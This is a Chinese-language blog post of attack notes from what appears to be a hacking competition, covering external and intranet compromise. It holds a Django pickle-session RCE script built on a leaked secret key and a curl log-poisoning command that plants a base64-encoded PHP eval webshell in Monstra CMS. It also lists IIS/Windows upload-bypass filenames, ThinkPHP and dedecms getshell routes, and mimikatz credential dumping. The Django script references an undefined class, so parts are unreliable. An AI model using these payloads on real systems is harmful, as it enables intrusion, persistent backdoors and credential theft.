<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>0x02 比赛分享 [ Breezy_Struggle ]</title><link rel="stylesheet" href="/css/meizj.css"><link rel="stylesheet" href="/css/prettify.css"><link rel="stylesheet" href="/css/tomorrow-night-blue.css"><link rel="stylesheet" href="/css/screen.css"><link rel="stylesheet" href="/css/tag.css"><script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script><script src="https://cdn.bootcss.com/lazysizes/5.1.0/lazysizes.min.js"></script><script>$("img").attr({"class":"lazyload"});



</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Breezy_Struggle" type="application/atom+xml">
</head><body><div id="menu-outer"><nav id="menu-inner"><a id="menuLabel" href="/">Home</a><a id="menuLabel" href="/about">About</a><a id="menuLabel" href="/archives">Archives</a><a id="menuLabel">Github</a></nav></div><div id="content-outer"><div id="content-inner"><div id="recent-posts"><a id="blogTitle">Breezy's Blog</a></div><article id="post"><h1 id="postTitle">0x02 比赛分享</h1><blockquote>
<p>打比赛才会在当前的满足之中找到真实自我</p>
</blockquote>
<h2 id="外网"><a href="#外网" class="headerlink" title="外网:"></a>外网:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DNS域传送  发现目标</span><br><span class="line">dig axfr @server_ip    query_domain</span><br><span class="line"></span><br><span class="line">nslookup</span><br><span class="line">&gt;server server_ip </span><br><span class="line">&gt;ls query_domain</span><br></pre></td></tr></table></figure>

<h3 id="1、PHP-反序列化字符串逃逸"><a href="#1、PHP-反序列化字符串逃逸" class="headerlink" title="1、PHP 反序列化字符串逃逸"></a>1、PHP 反序列化字符串逃逸</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">任意文件读取 file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd 为进程当前工作目录</span><br><span class="line">如Web应用为运行的当前脚本目录 </span><br><span class="line">通过该方式可以任意读取文件</span><br><span class="line"></span><br><span class="line">反序列化字符串逃逸 可参考去年的Joomla 3.4.0-3.4.6 由于解析字符串单双引号对\0的处理差异 导致字符串逃逸</span><br><span class="line">通过中间处理过程对序列化内容过滤或者格式化引起字符的增加和减少</span><br></pre></td></tr></table></figure>

<h3 id="2、Django-RCE"><a href="#2、Django-RCE" class="headerlink" title="2、Django RCE"></a>2、Django RCE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串漏洞&#123;&#125;      通过&#39;&#123;&#125;&#39;.format(param)    param输入为&#123;&#125; 内接django变量名可以读取变量值</span><br><span class="line">通过&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; 读取secretkey</span><br><span class="line">由于版本低于1.6   可以通过session反序列化RCE</span><br><span class="line"># coding: utf-8</span><br><span class="line">from django.contrib.sessions.serializers import PickleSerializer</span><br><span class="line">from django.core import signing</span><br><span class="line">from django.conf import settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY&#x3D;&#39;xxxxxxxxxxxxxxxxxxx&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Run(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        import os</span><br><span class="line">        return (os.system,(&#39;xxxxxx&#39;,))</span><br><span class="line"></span><br><span class="line">sess &#x3D; signing.dumps(</span><br><span class="line">    obj&#x3D;GetShellWithPython(),</span><br><span class="line">    serializer&#x3D;PickleSerializer,</span><br><span class="line">    salt&#x3D;&#39;django.contrib.sessions.backends.signed_cookies&#39;</span><br><span class="line">)</span><br><span class="line">import urllib2</span><br><span class="line">import cookielib</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;url&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Cookie&#39;:&#39;sessionid&#x3D;&quot;%s&quot;&#39; %(sess)&#125;</span><br><span class="line">request &#x3D; urllib2.Request(url,headers &#x3D; headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">搭建目标对应版本django  </span><br><span class="line">django startserver hello</span><br><span class="line">cd hello&#x2F;hello</span><br><span class="line">在django上下文环境执行该脚本实现RCE</span><br><span class="line"></span><br><span class="line">也可以自行通过Curl发送Cookie</span><br><span class="line">curl url --cookie &quot;sessionid&#x3D;cookie&quot;</span><br></pre></td></tr></table></figure>

<h3 id="3、PHP-CMS-Monstra"><a href="#3、PHP-CMS-Monstra" class="headerlink" title="3、PHP CMS Monstra"></a>3、PHP CMS Monstra</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 3.04 后台进入可上传php7绕过黑名单过滤    漏洞原因为可能发行时未考虑php7兼容性</span><br><span class="line">而在某些版本的系统下 全局配置中 有添加针对php7解析的内容</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;mime.types</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php7.0.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">参考 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7850</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;xxxxxxx&#x2F;storage&#x2F;database&#x2F;users.table.xml  泄露敏感信息--用户账号及加密后hash</span><br><span class="line">加密算法在 engine&#x2F;security.php   加上盐值一般未修改  可进行枚举</span><br><span class="line">define(&#39;MONSTRA_PASSWORD_SALT&#39;, &#39;YOUR_SALT_HERE&#39;);</span><br><span class="line"> md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));</span><br><span class="line"></span><br><span class="line">这边的做法是后台验证码 任意文件包含  通过包含日志文件getshell</span><br><span class="line">因为日志太多不建议直接写shell  通过访问存在路径作为参数写入</span><br><span class="line">curl -v &quot;http:&#x2F;&#x2F;url&#x2F;index.php?&lt;?php file_put_contents(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;plugins&#x2F;captcha&#x2F;crypt&#x2F;cryptogr4php.php&#39;,base64_decode(&#39;PD9waHAgQGV2YWwoJF9QT1NUWydjb3JuJ10pOz8+&#39;))?&gt;&quot;</span><br><span class="line">会提示400  但是能够写入到access_log下</span><br><span class="line">利用包含生成shell     Burp直接发送+会被记录成完整的+号 随后才会被中间件解析成空格</span><br></pre></td></tr></table></figure>
<h3 id="4、IIS-8-5-PHP-上传"><a href="#4、IIS-8-5-PHP-上传" class="headerlink" title="4、IIS 8.5 +PHP 上传"></a>4、IIS 8.5 +PHP 上传</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">php cgi.fix_pathinfo   配置漏洞   访问 xxx.jpg&#x2F;.php 实现解析</span><br><span class="line"></span><br><span class="line">上传Windows NTF 文件绕过后缀黑名单</span><br><span class="line">xxxxx::$INDEX_ALLOCATION  可创建 xxxx 文件夹  配合 IIS6.0目录解析漏洞使用</span><br><span class="line">test.php:a.jpg  创建文件为test.php 内容为空   结合 windows 特殊通配符&gt;&gt;&gt; 和??? 对文件内容写入</span><br><span class="line">test.php::$DATA\1.jpg            创建1.jpg    结合解析漏洞使用</span><br><span class="line"></span><br><span class="line">Windows格式化文件名绕过黑名单</span><br><span class="line">test.php.</span><br><span class="line">test.php空格</span><br><span class="line">test.php%0a</span><br><span class="line">test.php_</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2539</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">上传后通过Windows 短文件名 结合时间戳爆破shell</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;IIS_shortname_Scanner.git</span><br></pre></td></tr></table></figure>

<h3 id="5、ThinkPHP5"><a href="#5、ThinkPHP5" class="headerlink" title="5、ThinkPHP5"></a>5、ThinkPHP5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字段缓存漏洞  通过注入点多语句执行，新建表并修改字段名称，写入到xxxx.php中getshell</span><br><span class="line">TP通过数组提交可绕过过滤 </span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;153286.html</span><br></pre></td></tr></table></figure>

<h3 id="6-OA"><a href="#6-OA" class="headerlink" title="6.OA"></a>6.OA</h3><p>shiro 721 反序列化    爆破key</p>
<h3 id="8-dedecms"><a href="#8-dedecms" class="headerlink" title="8.dedecms"></a>8.dedecms</h3><p>后台弱口令  后台编辑模板 getshell </p>
<h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Weblogic  2019-2725</span><br><span class="line">Atlassian  CVE-2019-11580  rce   https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-11580</span><br><span class="line"></span><br><span class="line">ms17_010</span><br><span class="line">msf win8版本可打2012 某些版本</span><br><span class="line"></span><br><span class="line">net sessions  查看远程连接记录(被连)</span><br><span class="line"></span><br><span class="line">cmdkey &#x2F;list</span><br><span class="line">sekurlsa::ssp  获取远程连接凭证</span><br></pre></td></tr></table></figure>


</article><div id="paginator"></div><div id="toc"></div></div></div><div id="footer"><div id="bottom-inner"><span>Powerd By </span><span> Breezy </span><span>using    </span><a href="https://github.com/meizjm3i/Meizj" target="_blank" rel="noopener"><span>Meizj</span></a><span>.</span><br></div></div><script src="/js/prettify.js"></script><script src="/js/meizj.js"></script><script>//- $(window).on('load', function(){ 
$('pre').addClass('prettyprint linenums');
prettyPrint();
//- });
$(".gutter").remove();</script></body></html>